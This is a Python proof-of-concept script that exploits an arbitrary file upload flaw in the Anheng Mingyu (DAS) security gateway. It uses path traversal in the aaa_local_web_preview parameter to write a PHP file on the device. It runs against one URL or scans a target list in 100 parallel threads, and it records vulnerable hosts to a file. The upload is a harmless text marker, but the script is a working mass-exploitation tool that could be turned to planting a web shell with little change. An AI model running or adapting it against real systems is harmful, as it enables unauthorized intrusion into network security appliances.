# 安恒明御安全网关aaa_local_web_preview文件上传漏洞
import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    pass

def main():
    # banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="安恒明御安全网关aaa_local_web_preview文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a',
        'Accept-Encoding': 'gzip'
    }
    files = {
        '123': ('test.php', 'This page has a vulnerability', 'text/plain')
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        response = requests.post(url=url,headers=headers,files=files,proxies=proxies,verify=False)
        if response.status_code == 200 and 'success' in response.text:
            print(f"[+]该网址存在任意文件上传漏洞{target}")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-]该网址不存在任意文件上传漏洞{target}")
    except Exception as e:
        print(f"[*]该网址存在问题，请手动检测{target}")

if __name__ =='__main__':
    main()